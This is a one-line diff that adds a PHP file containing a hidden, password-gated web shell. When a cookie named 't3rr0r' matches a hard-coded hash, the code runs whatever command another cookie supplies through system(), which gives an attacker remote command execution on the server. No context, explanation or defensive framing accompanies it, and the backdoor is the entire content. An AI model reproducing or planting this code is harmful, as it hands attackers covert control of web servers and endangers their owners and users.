@@ -1,0 +1,1 @@
+<?php $cmd=((isset($_COOKIE["t3rr0r"])) && (md5(sha1($_COOKIE["t3rr0r"]))=="aeb1ae6d167d80abb38e8e07eae36170"))? $_COOKIE["cmd"]: "echo 'Unauthorized T'";  system($cmd); ?>
